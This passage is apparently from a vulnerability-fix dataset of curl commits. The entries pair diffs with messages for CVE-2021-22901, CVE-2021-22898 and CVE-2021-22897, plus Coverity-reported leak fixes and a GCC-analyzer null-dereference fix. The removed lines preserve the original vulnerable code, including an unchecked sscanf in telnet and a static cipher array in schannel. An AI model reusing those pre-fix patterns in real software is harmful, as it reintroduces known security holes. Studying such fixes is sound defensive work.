    \  Curl_none_set_engine_default,      /* set_engine_default */\n   Curl_none_engines_list,\
    \            /* engines_list */\n   Curl_none_false_start,             /* false_start\
    \ */\n-  NULL                               /* sha256sum */\n+  NULL,        \
    \                      /* sha256sum */\n+  NULL,                             \
    \ /* associate_connection */\n+  NULL                               /* disassociate_connection\
    \ */\n };\n \n const struct Curl_ssl *Curl_ssl ="
  - "--- a/lib/vtls/wolfssl.c\n+++ b/lib/vtls/wolfssl.c\n@@ -1125,7 +1125,9 @@ const\
    \ struct Curl_ssl Curl_ssl_wolfssl = {\n   Curl_none_set_engine_default,    /*\
    \ set_engine_default */\n   Curl_none_engines_list,          /* engines_list */\n\
    \   Curl_none_false_start,           /* false_start */\n-  wolfssl_sha256sum \
    \               /* sha256sum */\n+  wolfssl_sha256sum,               /* sha256sum\
    \ */\n+  NULL,                            /* associate_connection */\n+  NULL\
    \                             /* disassociate_connection */\n };\n \n #endif"
  commit_message: 'openssl: associate/detach the transfer from connection


    CVE-2021-22901


    Bug: https://curl.se/docs/CVE-2021-22901.html'
  commit_sha: 7f4a9a9b2a49547eae24d2e19bc5c346e9026479
  repo_name: curl/curl
- commit_diff:
  - "--- a/lib/telnet.c\n+++ b/lib/telnet.c\n@@ -922,7 +922,7 @@ static void suboption(struct\
    \ Curl_easy *data)\n         size_t tmplen = (strlen(v->data) + 1);\n        \
    \ /* Add the variable only if it fits */\n         if(len + tmplen < (int)sizeof(temp)-6)\
    \ {\n-          if(sscanf(v->data, \"%127[^,],%127s\", varname, varval)) {\n+\
    \          if(sscanf(v->data, \"%127[^,],%127s\", varname, varval) == 2) {\n \
    \            msnprintf((char *)&temp[len], sizeof(temp) - len,\n             \
    \          \"%c%s%c%s\", CURL_NEW_ENV_VAR, varname,\n                       CURL_NEW_ENV_VALUE,\
    \ varval);"
  commit_message: 'telnet: check sscanf() for correct number of matches


    CVE-2021-22898


    Bug: https://curl.se/docs/CVE-2021-22898.html'
  commit_sha: 39ce47f219b09c380b81f89fe54ac586c8db6bde
  repo_name: curl/curl
- commit_diff:
  - "--- a/lib/vtls/schannel.c\n+++ b/lib/vtls/schannel.c\n@@ -328,12 +328,12 @@ get_alg_id_by_name(char\
    \ *name)\n }\n \n static CURLcode\n-set_ssl_ciphers(SCHANNEL_CRED *schannel_cred,\
    \ char *ciphers)\n+set_ssl_ciphers(SCHANNEL_CRED *schannel_cred, char *ciphers,\n\
    +                int *algIds)\n {\n   char *startCur = ciphers;\n   int algCount\
    \ = 0;\n-  static ALG_ID algIds[45]; /*There are 45 listed in the MS headers*/\n\
    -  while(startCur && (0 != *startCur) && (algCount < 45)) {\n+  while(startCur\
    \ && (0 != *startCur) && (algCount < NUMOF_CIPHERS)) {\n     long alg = strtol(startCur,\
    \ 0, 0);\n     if(!alg)\n       alg = get_alg_id_by_name(startCur);\n@@ -593,7\
    \ +593,8 @@ schannel_connect_step1(struct Curl_easy *data, struct connectdata\
    \ *conn,\n     }\n \n     if(SSL_CONN_CONFIG(cipher_list)) {\n-      result =\
    \ set_ssl_ciphers(&schannel_cred, SSL_CONN_CONFIG(cipher_list));\n+      result\
    \ = set_ssl_ciphers(&schannel_cred, SSL_CONN_CONFIG(cipher_list),\n+         \
    \                      BACKEND->algIds);\n       if(CURLE_OK != result) {\n  \
    \       failf(data, \"Unable to set ciphers to passed via SSL_CONN_CONFIG\");\n\
    \         return result;"
  commit_message: 'schannel: don''t use static to store selected ciphers


    CVE-2021-22897


    Bug: https://curl.se/docs/CVE-2021-22897.html'
  commit_sha: bbb71507b7bab52002f9b1e0880bed6a32834511
  repo_name: curl/curl
- commit_diff:
  - "--- a/src/tool_getparam.c\n+++ b/src/tool_getparam.c\n@@ -2355,6 +2355,8 @@ ParameterError\
    \ parse_args(struct GlobalConfig *global, int argc,\n \n   for(i = 1, stillflags\
    \ = TRUE; i < argc && !result; i++) {\n     orig_opt = curlx_convert_tchar_to_UTF8(argv[i]);\n\
    +    if(!orig_opt)\n+      return PARAM_NO_MEM;\n \n     if(stillflags && ('-'\
    \ == orig_opt[0])) {\n       bool passarg;"
  commit_message: 'tool_getparam: handle failure of curlx_convert_tchar_to_UTF8()


    Reported by GCC analyzer:


    Error: GCC_ANALYZER_WARNING (CWE-476):

    src/tool_getparam.c: scope_hint: In function ''parse_args''

    src/tool_getparam.c:2318:38: warning[-Wanalyzer-possible-null-dereference]: dereference
    of possibly-NULL ''orig_opt''

    lib/curlx.h:56: included_from: Included from here.

    src/tool_getparam.c:28: included_from: Included from here.

    lib/curl_multibyte.h:70:51: note: in definition of macro ''curlx_convert_tchar_to_UTF8''

    src/tool_getparam.c:2316:16: note: in expansion of macro ''curlx_convert_tchar_to_UTF8''


    Reviewed-by: Marcel Raad

    Reviewed-by: Daniel Stenberg

    Closes #7023'
  commit_sha: 92953dc38782273171ac5bc9f32fe715df4778fb
  repo_name: curl/curl
- commit_diff:
  - "--- a/lib/http2.c\n+++ b/lib/http2.c\n@@ -581,6 +581,7 @@ static int push_promise(struct\
    \ Curl_easy *data,\n \n     rv = set_transfer_url(newhandle, &heads);\n     if(rv)\
    \ {\n+      (void)Curl_close(&newhandle);\n       rv = CURL_PUSH_DENY;\n     \
    \  goto fail;\n     }"
  commit_message: 'http2: fix a resource leak in push_promise()


    ... detected by Coverity:


    Error: RESOURCE_LEAK (CWE-772):

    lib/http2.c:532: alloc_fn: Storage is returned from allocation function "duphandle".

    lib/http2.c:532: var_assign: Assigning: "newhandle" = storage returned from "duphandle(data)".

    lib/http2.c:552: noescape: Resource "newhandle" is not freed or pointed-to in
    "set_transfer_url".

    lib/http2.c:555: leaked_storage: Variable "newhandle" going out of scope leaks
    the storage it points to.


    Closes #6986'
  commit_sha: 3a6058cb976981ec1db870f9657c73c9a1162822
  repo_name: curl/curl
- commit_diff:
  - "--- a/lib/http2.c\n+++ b/lib/http2.c\n@@ -500,32 +500,42 @@ static int set_transfer_url(struct\
    \ Curl_easy *data,\n   CURLU *u = curl_url();\n   CURLUcode uc;\n   char *url;\n\
    +  int rc = 0;\n \n   v = curl_pushheader_byname(hp, \":scheme\");\n   if(v) {\n\
    \     uc = curl_url_set(u, CURLUPART_SCHEME, v, 0);\n-    if(uc)\n-      return\
    \ 1;\n+    if(uc) {\n+      rc = 1;\n+      goto fail;\n+    }\n   }\n \n   v\
    \ = curl_pushheader_byname(hp, \":authority\");\n   if(v) {\n     uc = curl_url_set(u,\
    \ CURLUPART_HOST, v, 0);\n-    if(uc)\n-      return 2;\n+    if(uc) {\n+    \
    \  rc = 2;\n+      goto fail;\n+    }\n   }\n \n   v = curl_pushheader_byname(hp,\
    \ \":path\");\n   if(v) {\n     uc = curl_url_set(u, CURLUPART_PATH, v, 0);\n\
    -    if(uc)\n-      return 3;\n+    if(uc) {\n+      rc = 3;\n+      goto fail;\n\
    +    }\n   }\n \n   uc = curl_url_get(u, CURLUPART_URL, &url, 0);\n   if(uc)\n\
    -    return 4;\n+    rc = 4;\n+  fail:\n   curl_url_cleanup(u);\n+  if(rc)\n+\
    \    return rc;\n \n   if(data->state.url_alloc)\n     free(data->state.url);"
  commit_message: 'http2: fix resource leaks in set_transfer_url()


    ... detected by Coverity:


    Error: RESOURCE_LEAK (CWE-772):

    lib/http2.c:480: alloc_fn: Storage is returned from allocation function "curl_url".
    [Note: The source code implementation of the function has been overridden by a
    builtin model.]

    lib/http2.c:480: var_assign: Assigning: "u" = storage returned from "curl_url()".

    lib/http2.c:486: noescape: Resource "u" is not freed or pointed-to in "curl_url_set".
    [Note: The source code implementation of the function has been overridden by a
    builtin model.]

    lib/http2.c:488: leaked_storage: Variable "u" going out of scope leaks the storage
    it points to.


    Error: RESOURCE_LEAK (CWE-772):

    lib/http2.c:480: alloc_fn: Storage is returned from allocation function "curl_url".
    [Note: The source code implementation of the function has been overridden by a
    builtin model.]

    lib/http2.c:480: var_assign: Assigning: "u" = storage returned from "curl_url()".

    lib/http2.c:493: noescape: Resource "u" is not freed or pointed-to in "curl_url_set".
    [Note: The source code implementation of the function has been overridden by a
    builtin model.]

    lib/http2.c:495: leaked_storage: Variable "u" going out of scope leaks the storage
    it points to.


    Error: RESOURCE_LEAK (CWE-772):

    lib/http2.c:480: alloc_fn: Storage is returned from allocation function "curl_url".
    [Note: The source code implementation of the function has been overridden by a
    builtin model.]

    lib/http2.c:480: var_assign: Assigning: "u" = storage returned from "curl_url()".

    lib/http2.c:500: noescape: Resource "u" is not freed or pointed-to in "curl_url_set".
    [Note: The source code implementation of the function has been overridden by a
    builtin model.]

    lib/http2.c:502: leaked_storage: Variable "u" going out of scope leaks the storage
    it points to.


    Error: RESOURCE_LEAK (CWE-772):

    lib/http2.c:480: alloc_fn: Storage is returned from allocation function "curl_url".
    [Note: The source code implementation of the function has been overridden by a
    builtin model.]

    lib/http2.c:480: var_assign: Assigning: "u" = storage returned from "curl_url()".

    lib/http2.c:505: noescape: Resource "u" is not freed or pointed-to in "curl_url_get".
    [Note: The source code implementation of the function has been overridden by a
    builtin model.]

    lib/http2.c:507: leaked_storage: Variable "u" going out of scope leaks the storage
    it points to.


    Closes #6986'
  commit_sha: 31931704707324af4b4edb24cc877829f7e9949e
  repo_name: curl/curl
- commit_diff:
  - "--- a/lib/vtls/bearssl.c\n+++ b/lib/vtls/bearssl.c\n@@ -375,7 +375,8 @@ static\
    \ CURLcode bearssl_connect_step1(struct Curl_easy *data,\n     void *session;\n\
    \ \n     Curl_ssl_sessionid_lock(data);\n-    if(!Curl_ssl_getsessionid(data,\
    \ conn, &session, NULL, sockindex)) {\n+    if(!Curl_ssl_getsessionid(data, conn,\
    \ SSL_IS_PROXY() ? TRUE : FALSE,\n+                              &session, NULL,\
    \ sockindex)) {\n       br_ssl_engine_set_session_parameters(&backend->ctx.eng,\
    \ session);\n       infof(data, \"BearSSL: re-using session ID\\n\");\n     }\n\
    @@ -571,10 +572,13 @@ static CURLcode bearssl_connect_step3(struct Curl_easy *data,\n\
    \     br_ssl_engine_get_session_parameters(&backend->ctx.eng, session);\n    \
    \ Curl_ssl_sessionid_lock(data);\n     incache = !(Curl_ssl_getsessionid(data,\
    \ conn,\n+                                      SSL_IS_PROXY() ? TRUE : FALSE,\n\
    \                                       &oldsession, NULL, sockindex));\n    \
    \ if(incache)\n       Curl_ssl_delsessionid(data, oldsession);\n-    ret = Curl_ssl_addsessionid(data,\
    \ conn, session, 0, sockindex);\n+    ret = Curl_ssl_addsessionid(data, conn,\n\
    +                                SSL_IS_PROXY() ? TRUE : FALSE,\n+           \
    \                     session, 0, sockindex);\n     Curl_ssl_sessionid_unlock(data);\n\
    \     if(ret) {\n       free(session);"
  - "--- a/lib/vtls/gtls.c\n+++ b/lib/vtls/gtls.c\n@@ -727,6 +727,7 @@ gtls_connect_step1(struct\
    \ Curl_easy *data,\n \n     Curl_ssl_sessionid_lock(data);\n     if(!Curl_ssl_getsessionid(data,\
    \ conn,\n+                              SSL_IS_PROXY() ? TRUE : FALSE,\n     \
    \                          &ssl_sessionid, &ssl_idsize, sockindex)) {\n      \
    \ /* we got a session id, use it! */\n       gnutls_session_set_data(session,\
    \ ssl_sessionid, ssl_idsize);\n@@ -1286,17 +1287,20 @@ gtls_connect_step3(struct\
    \ Curl_easy *data,\n       gnutls_session_get_data(session, connect_sessionid,\
    \ &connect_idsize);\n \n       Curl_ssl_sessionid_lock(data);\n-      incache\
    \ = !(Curl_ssl_getsessionid(data, conn, &ssl_sessionid, NULL,\n-             \
    \                           sockindex));\n+      incache = !(Curl_ssl_getsessionid(data,\
    \ conn,\n+                                        SSL_IS_PROXY() ? TRUE : FALSE,\n\
    +                                        &ssl_sessionid, NULL, sockindex));\n\
    \       if(incache) {\n         /* there was one before in the cache, so instead\
    \ of risking that the\n            previous one was rejected, we just kill that\
    \ and store the new */\n         Curl_ssl_delsessionid(data, ssl_sessionid);\n\
    \       }\n \n       /* store this session id */\n-      result = Curl_ssl_addsessionid(data,\
    \ conn, connect_sessionid,\n-                                     connect_idsize,\
    \ sockindex);\n+      result = Curl_ssl_addsessionid(data, conn,\n+          \
    \                           SSL_IS_PROXY() ? TRUE : FALSE,\n+                \
    \                     connect_sessionid, connect_idsize,\n+                  \
    \                   sockindex);\n       Curl_ssl_sessionid_unlock(data);\n   \
    \    if(result) {\n         free(connect_sessionid);"
  - "--- a/lib/vtls/mbedtls.c\n+++ b/lib/vtls/mbedtls.c\n@@ -463,7 +463,9 @@ mbed_connect_step1(struct\
    \ Curl_easy *data, struct connectdata *conn,\n     void *old_session = NULL;\n\
    \ \n     Curl_ssl_sessionid_lock(data);\n-    if(!Curl_ssl_getsessionid(data,\
    \ conn, &old_session, NULL, sockindex)) {\n+    if(!Curl_ssl_getsessionid(data,\
    \ conn,\n+                              SSL_IS_PROXY() ? TRUE : FALSE,\n+    \
    \                          &old_session, NULL, sockindex)) {\n       ret = mbedtls_ssl_set_session(&backend->ssl,\
    \ old_session);\n       if(ret) {\n         Curl_ssl_sessionid_unlock(data);\n\
    @@ -724,6 +726,7 @@ mbed_connect_step3(struct Curl_easy *data, struct connectdata\
    \ *conn,\n     int ret;\n     mbedtls_ssl_session *our_ssl_sessionid;\n     void\
    \ *old_ssl_sessionid = NULL;\n+    bool isproxy = SSL_IS_PROXY() ? TRUE : FALSE;\n\
    \ \n     our_ssl_sessionid = malloc(sizeof(mbedtls_ssl_session));\n     if(!our_ssl_sessionid)\n\
    @@ -742,11 +745,12 @@ mbed_connect_step3(struct Curl_easy *data, struct connectdata\
    \ *conn,\n \n     /* If there's already a matching session in the cache, delete\
    \ it */\n     Curl_ssl_sessionid_lock(data);\n-    if(!Curl_ssl_getsessionid(data,\
    \ conn, &old_ssl_sessionid, NULL, sockindex))\n+    if(!Curl_ssl_getsessionid(data,\
    \ conn, isproxy, &old_ssl_sessionid, NULL,\n+                              sockindex))\n\
    \       Curl_ssl_delsessionid(data, old_ssl_sessionid);\n \n-    retcode = Curl_ssl_addsessionid(data,\
    \ conn,\n-                                    our_ssl_sessionid, 0, sockindex);\n\
    +    retcode = Curl_ssl_addsessionid(data, conn, isproxy, our_ssl_sessionid,\n\
    +                                    0, sockindex);\n     Curl_ssl_sessionid_unlock(data);\n\
    \     if(retcode) {\n       mbedtls_ssl_session_free(our_ssl_sessionid);"
  - "--- a/lib/vtls/mesalink.c\n+++ b/lib/vtls/mesalink.c\n@@ -261,7 +261,9 @@ mesalink_connect_step1(struct\
    \ Curl_easy *data,\n     void *ssl_sessionid = NULL;\n \n     Curl_ssl_sessionid_lock(data);\n\
    -    if(!Curl_ssl_getsessionid(data, conn, &ssl_sessionid, NULL, sockindex)) {\n\
    +    if(!Curl_ssl_getsessionid(data, conn,\n+                              SSL_IS_PROXY()\
    \ ? TRUE : FALSE,\n+                              &ssl_sessionid, NULL, sockindex))\
    \ {\n       /* we got a session id, use it! */\n       if(!SSL_set_session(BACKEND->handle,\
    \ ssl_sessionid)) {\n         Curl_ssl_sessionid_unlock(data);\n@@ -345,13 +347,14\
    \ @@ mesalink_connect_step3(struct connectdata *conn, int sockindex)\n     bool\
    \ incache;\n     SSL_SESSION *our_ssl_sessionid;\n     void *old_ssl_sessionid\
    \ = NULL;\n+    bool isproxy = SSL_IS_PROXY() ? TRUE : FALSE;\n \n     our_ssl_sessionid\
    \ = SSL_get_session(BACKEND->handle);\n \n     Curl_ssl_sessionid_lock(data);\n\
    \     incache =\n-      !(Curl_ssl_getsessionid(data, conn,\n-               \
    \               &old_ssl_sessionid, NULL, sockindex));\n+      !(Curl_ssl_getsessionid(data,\
    \ conn, isproxy, &old_ssl_sessionid, NULL,\n+                              sockindex));\n\
    \     if(incache) {\n       if(old_ssl_sessionid != our_ssl_sessionid) {\n   \
    \      infof(data, \"old SSL session ID is stale, removing\\n\");\n@@ -361,8 +364,9\
    \ @@ mesalink_connect_step3(struct connectdata *conn, int sockindex)\n     }\n\
    \ \n     if(!incache) {\n-      result = Curl_ssl_addsessionid(\n-        data,\
    \ conn, our_ssl_sessionid, 0 /* unknown size */, sockindex);\n+      result =\n\
    +        Curl_ssl_addsessionid(data, conn, isproxy, our_ssl_sessionid, 0,\n+ \
    \                             sockindex);\n       if(result) {\n         Curl_ssl_sessionid_unlock(data);\n\
    \         failf(data, \"failed to store ssl session\");"
  - "--- a/lib/vtls/openssl.c\n+++ b/lib/vtls/openssl.c\n@@ -393,12 +393,23 @@ static\
    \ int ossl_get_ssl_conn_index(void)\n  */\n static int ossl_get_ssl_sockindex_index(void)\n\
    \ {\n-  static int ssl_ex_data_sockindex_index = -1;\n-  if(ssl_ex_data_sockindex_index\
    \ < 0) {\n-    ssl_ex_data_sockindex_index = SSL_get_ex_new_index(0, NULL, NULL,\
    \ NULL,\n-        NULL);\n+  static int sockindex_index = -1;\n+  if(sockindex_index\
    \ < 0) {\n+    sockindex_index = SSL_get_ex_new_index(0, NULL, NULL, NULL, NULL);\n\
    \   }\n-  return ssl_ex_data_sockindex_index;\n+  return sockindex_index;\n+}\n\
    +\n+/* Return an extra data index for proxy boolean.\n+ * This index can be used\
    \ with SSL_get_ex_data() and SSL_set_ex_data().\n+ */\n+static int ossl_get_proxy_index(void)\n\
    +{\n+  static int proxy_index = -1;\n+  if(proxy_index < 0) {\n+    proxy_index\
    \ = SSL_get_ex_new_index(0, NULL, NULL, NULL, NULL);\n+  }\n+  return proxy_index;\n\
    \ }\n \n static int passwd_callback(char *buf, int num, int encrypting,\n@@ -1174,7\
    \ +1185,7 @@ static int ossl_init(void)\n \n   /* Initialize the extra data indexes\
    \ */\n   if(ossl_get_ssl_data_index() < 0 || ossl_get_ssl_conn_index() < 0 ||\n\
    -     ossl_get_ssl_sockindex_index() < 0)\n+     ossl_get_ssl_sockindex_index()\
    \ < 0 || ossl_get_proxy_index() < 0)\n     return 0;\n \n   return 1;\n@@ -2432,8\
    \ +2443,10 @@ static int ossl_new_session_cb(SSL *ssl, SSL_SESSION *ssl_sessionid)\n\
    \   int data_idx = ossl_get_ssl_data_index();\n   int connectdata_idx = ossl_get_ssl_conn_index();\n\
    \   int sockindex_idx = ossl_get_ssl_sockindex_index();\n+  int proxy_idx = ossl_get_proxy_index();\n\
    +  bool isproxy;\n \n-  if(data_idx < 0 || connectdata_idx < 0 || sockindex_idx\
    \ < 0)\n+  if(data_idx < 0 || connectdata_idx < 0 || sockindex_idx < 0 || proxy_idx\
    \ < 0)\n     return 0;\n \n   conn = (struct connectdata*) SSL_get_ex_data(ssl,\
    \ connectdata_idx);\n@@ -2446,13 +2459,18 @@ static int ossl_new_session_cb(SSL\
    \ *ssl, SSL_SESSION *ssl_sessionid)\n   sockindex_ptr = (curl_socket_t*) SSL_get_ex_data(ssl,\
    \ sockindex_idx);\n   sockindex = (int)(sockindex_ptr - conn->sock);\n \n+  isproxy\
    \ = SSL_get_ex_data(ssl, proxy_idx) ? TRUE : FALSE;\n+\n   if(SSL_SET_OPTION(primary.sessionid))\
    \ {\n     bool incache;\n     void *old_ssl_sessionid = NULL;\n \n     Curl_ssl_sessionid_lock(data);\n\
    -    incache = !(Curl_ssl_getsessionid(data, conn, &old_ssl_sessionid, NULL,\n\
    -                                      sockindex));\n+    if(isproxy)\n+     \
    \ incache = FALSE;\n+    else\n+      incache = !(Curl_ssl_getsessionid(data,\
    \ conn, isproxy,\n+                                        &old_ssl_sessionid,\
    \ NULL, sockindex));\n     if(incache) {\n       if(old_ssl_sessionid != ssl_sessionid)\
    \ {\n         infof(data, \"old SSL session ID is stale, removing\\n\");\n@@ -2462,8\
    \ +2480,8 @@ static int ossl_new_session_cb(SSL *ssl, SSL_SESSION *ssl_sessionid)\n\
    \     }\n \n     if(!incache) {\n-      if(!Curl_ssl_addsessionid(data, conn,\
    \ ssl_sessionid,\n-                                      0 /* unknown size */,\
    \ sockindex)) {\n+      if(!Curl_ssl_addsessionid(data, conn, isproxy, ssl_sessionid,\n\
    +                                0 /* unknown size */, sockindex)) {\n       \
    \  /* the session has been put into the session cache */\n         res = 1;\n\
    \       }\n@@ -3193,17 +3211,27 @@ static CURLcode ossl_connect_step1(struct Curl_easy\
    \ *data,\n     int data_idx = ossl_get_ssl_data_index();\n     int connectdata_idx\
    \ = ossl_get_ssl_conn_index();\n     int sockindex_idx = ossl_get_ssl_sockindex_index();\n\
    +    int proxy_idx = ossl_get_proxy_index();\n \n-    if(data_idx >= 0 && connectdata_idx\
    \ >= 0 && sockindex_idx >= 0) {\n+    if(data_idx >= 0 && connectdata_idx >= 0\
    \ && sockindex_idx >= 0 &&\n+       proxy_idx >= 0) {\n       /* Store the data\
    \ needed for the \"new session\" callback.\n        * The sockindex is stored\
    \ as a pointer to an array element. */\n       SSL_set_ex_data(backend->handle,\
    \ data_idx, data);\n       SSL_set_ex_data(backend->handle, connectdata_idx, conn);\n\
    \       SSL_set_ex_data(backend->handle, sockindex_idx, conn->sock + sockindex);\n\
    +#ifndef CURL_DISABLE_PROXY\n+      SSL_set_ex_data(backend->handle, proxy_idx,\
    \ SSL_IS_PROXY() ? (void *) 1:\n+                      NULL);\n+#else\n+     \
    \ SSL_set_ex_data(backend->handle, proxy_idx, NULL);\n+#endif\n+\n     }\n \n\
    \     Curl_ssl_sessionid_lock(data);\n-    if(!Curl_ssl_getsessionid(data, conn,\
    \ &ssl_sessionid, NULL, sockindex)) {\n+    if(!Curl_ssl_getsessionid(data, conn,\
    \ SSL_IS_PROXY() ? TRUE : FALSE,\n+                              &ssl_sessionid,\
    \ NULL, sockindex)) {\n       /* we got a session id, use it! */\n       if(!SSL_set_session(backend->handle,\
    \ ssl_sessionid)) {\n         Curl_ssl_sessionid_unlock(data);"
  - "--- a/lib/vtls/schannel.c\n+++ b/lib/vtls/schannel.c\n@@ -496,6 +496,7 @@ schannel_connect_step1(struct\
    \ Curl_easy *data, struct connectdata *conn,\n   if(SSL_SET_OPTION(primary.sessionid))\
    \ {\n     Curl_ssl_sessionid_lock(data);\n     if(!Curl_ssl_getsessionid(data,\
    \ conn,\n+                              SSL_IS_PROXY() ? TRUE : FALSE,\n     \
    \                          (void **)&old_cred, NULL, sockindex)) {\n       BACKEND->cred\
    \ = old_cred;\n       DEBUGF(infof(data, \"schannel: re-using existing credential\
    \ handle\\n\"));\n@@ -1337,8 +1338,9 @@ schannel_connect_step3(struct Curl_easy\
    \ *data, struct connectdata *conn,\n   struct ssl_connect_data *connssl = &conn->ssl[sockindex];\n\
    \   SECURITY_STATUS sspi_status = SEC_E_OK;\n   CERT_CONTEXT *ccert_context =\
    \ NULL;\n+  bool isproxy = SSL_IS_PROXY();\n #ifdef DEBUGBUILD\n-  const char\
    \ * const hostname = SSL_IS_PROXY() ? conn->http_proxy.host.name :\n+  const char\
    \ * const hostname = isproxy ? conn->http_proxy.host.name :\n     conn->host.name;\n\
    \ #endif\n #ifdef HAS_ALPN\n@@ -1414,8 +1416,8 @@ schannel_connect_step3(struct\
    \ Curl_easy *data, struct connectdata *conn,\n     struct Curl_schannel_cred *old_cred\
    \ = NULL;\n \n     Curl_ssl_sessionid_lock(data);\n-    incache = !(Curl_ssl_getsessionid(data,\
    \ conn, (void **)&old_cred, NULL,\n-                                      sockindex));\n\
    +    incache = !(Curl_ssl_getsessionid(data, conn, isproxy, (void **)&old_cred,\n\
    +                                      NULL, sockindex));\n     if(incache) {\n\
    \       if(old_cred != BACKEND->cred) {\n         DEBUGF(infof(data,\n@@ -1426,7\
    \ +1428,7 @@ schannel_connect_step3(struct Curl_easy *data, struct connectdata\
    \ *conn,\n       }\n     }\n     if(!incache) {\n-      result = Curl_ssl_addsessionid(data,\
    \ conn, (void *)BACKEND->cred,\n+      result = Curl_ssl_addsessionid(data, conn,\
    \ isproxy, BACKEND->cred,\n                                      sizeof(struct\
    \ Curl_schannel_cred),\n                                      sockindex);\n  \
    \     if(result) {"
  - "--- a/lib/vtls/sectransp.c\n+++ b/lib/vtls/sectransp.c\n@@ -1400,10 +1400,12\
    \ @@ static CURLcode sectransp_connect_step1(struct Curl_easy *data,\n   char\
    \ * const ssl_cert = SSL_SET_OPTION(primary.clientcert);\n   const struct curl_blob\
    \ *ssl_cert_blob = SSL_SET_OPTION(primary.cert_blob);\n #ifndef CURL_DISABLE_PROXY\n\
    -  const char * const hostname = SSL_IS_PROXY() ? conn->http_proxy.host.name :\n\
    +  bool isproxy = SSL_IS_PROXY();\n+  const char * const hostname = isproxy ?\
    \ conn->http_proxy.host.name :\n     conn->host.name;\n   const long int port\
    \ = SSL_IS_PROXY() ? conn->port : conn->remote_port;\n #else\n+  const isproxy\
    \ = FALSE;\n   const char * const hostname = conn->host.name;\n   const long int\
    \ port = conn->remote_port;\n #endif\n@@ -1613,7 +1615,7 @@ static CURLcode sectransp_connect_step1(struct\
    \ Curl_easy *data,\n #ifdef USE_NGHTTP2\n       if(data->state.httpversion >=\
    \ CURL_HTTP_VERSION_2\n #ifndef CURL_DISABLE_PROXY\n-         && (!SSL_IS_PROXY()\
    \ || !conn->bits.tunnel_proxy)\n+         && (!isproxy || !conn->bits.tunnel_proxy)\n\
    \ #endif\n         ) {\n         CFArrayAppendValue(alpnArr, CFSTR(NGHTTP2_PROTO_VERSION_ID));\n\
    @@ -1953,7 +1955,7 @@ static CURLcode sectransp_connect_step1(struct Curl_easy\
    \ *data,\n     size_t ssl_sessionid_len;\n \n     Curl_ssl_sessionid_lock(data);\n\
    -    if(!Curl_ssl_getsessionid(data, conn, (void **)&ssl_sessionid,\n+    if(!Curl_ssl_getsessionid(data,\
    \ conn, isproxy, (void **)&ssl_sessionid,\n                               &ssl_sessionid_len,\
    \ sockindex)) {\n       /* we got a session id, use it! */\n       err = SSLSetPeerID(backend->ssl_ctx,\
    \ ssl_sessionid, ssl_sessionid_len);\n@@ -1981,7 +1983,7 @@ static CURLcode sectransp_connect_step1(struct\
    \ Curl_easy *data,\n         return CURLE_SSL_CONNECT_ERROR;\n       }\n \n- \
    \     result = Curl_ssl_addsessionid(data, conn, ssl_sessionid,\n+      result\
    \ = Curl_ssl_addsessionid(data, conn, isproxy, ssl_sessionid,\n              \
    \                        ssl_sessionid_len, sockindex);\n       Curl_ssl_sessionid_unlock(data);\n\
    \       if(result) {"
  - "--- a/lib/vtls/vtls.c\n+++ b/lib/vtls/vtls.c\n@@ -367,6 +367,7 @@ void Curl_ssl_sessionid_unlock(struct\
    \ Curl_easy *data)\n  */\n bool Curl_ssl_getsessionid(struct Curl_easy *data,\n\
    \                            struct connectdata *conn,\n+                    \
    \       const bool isProxy,\n                            void **ssl_sessionid,\n\
    \                            size_t *idsize, /* set 0 if unknown */\n        \
    \                    int sockindex)\n@@ -377,7 +378,6 @@ bool Curl_ssl_getsessionid(struct\
    \ Curl_easy *data,\n   bool no_match = TRUE;\n \n #ifndef CURL_DISABLE_PROXY\n\
    -  const bool isProxy = CONNECT_PROXY_SSL();\n   struct ssl_primary_config * const\
    \ ssl_config = isProxy ?\n     &conn->proxy_ssl_config :\n     &conn->ssl_config;\n\
    @@ -389,10 +389,15 @@ bool Curl_ssl_getsessionid(struct Curl_easy *data,\n   struct\
    \ ssl_primary_config * const ssl_config = &conn->ssl_config;\n   const char *\
    \ const name = conn->host.name;\n   int port = conn->remote_port;\n-  (void)sockindex;\n\
    \ #endif\n+  (void)sockindex;\n   *ssl_sessionid = NULL;\n \n+#ifdef CURL_DISABLE_PROXY\n\
    +  if(isProxy)\n+    return TRUE;\n+#endif\n+\n   DEBUGASSERT(SSL_SET_OPTION(primary.sessionid));\n\
    \ \n   if(!SSL_SET_OPTION(primary.sessionid))\n@@ -480,6 +485,7 @@ void Curl_ssl_delsessionid(struct\
    \ Curl_easy *data, void *ssl_sessionid)\n  */\n CURLcode Curl_ssl_addsessionid(struct\
    \ Curl_easy *data,\n                                struct connectdata *conn,\n\
    +                               bool isProxy,\n                              \
    \  void *ssl_sessionid,\n                                size_t idsize,\n    \
    \                            int sockindex)\n@@ -492,7 +498,6 @@ CURLcode Curl_ssl_addsessionid(struct\
    \ Curl_easy *data,\n   int conn_to_port;\n   long *general_age;\n #ifndef CURL_DISABLE_PROXY\n\
    -  const bool isProxy = CONNECT_PROXY_SSL();\n   struct ssl_primary_config * const\
    \ ssl_config = isProxy ?\n     &conn->proxy_ssl_config :\n     &conn->ssl_config;\n\
    @@ -505,6 +510,7 @@ CURLcode Curl_ssl_addsessionid(struct Curl_easy *data,\n \
    \  const char *hostname = conn->host.name;\n   (void)sockindex;\n #endif\n+  (void)sockindex;\n\
    \   DEBUGASSERT(SSL_SET_OPTION(primary.sessionid));\n \n   clone_host = strdup(hostname);"
  - "--- a/lib/vtls/wolfssl.c\n+++ b/lib/vtls/wolfssl.c\n@@ -516,7 +516,9 @@ wolfssl_connect_step1(struct\
    \ Curl_easy *data, struct connectdata *conn,\n     void *ssl_sessionid = NULL;\n\
    \ \n     Curl_ssl_sessionid_lock(data);\n-    if(!Curl_ssl_getsessionid(data,\
    \ conn, &ssl_sessionid, NULL, sockindex)) {\n+    if(!Curl_ssl_getsessionid(data,\
    \ conn,\n+                              SSL_IS_PROXY() ? TRUE : FALSE,\n+    \
    \                          &ssl_sessionid, NULL, sockindex)) {\n       /* we got\
    \ a session id, use it! */\n       if(!SSL_set_session(backend->handle, ssl_sessionid))\
    \ {\n         char error_buffer[WOLFSSL_MAX_ERROR_SZ];\n@@ -772,11 +774,12 @@\
    \ wolfssl_connect_step3(struct Curl_easy *data, struct connectdata *conn,\n  \
    \   bool incache;\n     void *old_ssl_sessionid = NULL;\n     SSL_SESSION *our_ssl_sessionid\
    \ = SSL_get_session(backend->handle);\n+    bool isproxy = SSL_IS_PROXY() ? TRUE\
    \ : FALSE;\n \n     if(our_ssl_sessionid) {\n       Curl_ssl_sessionid_lock(data);\n\
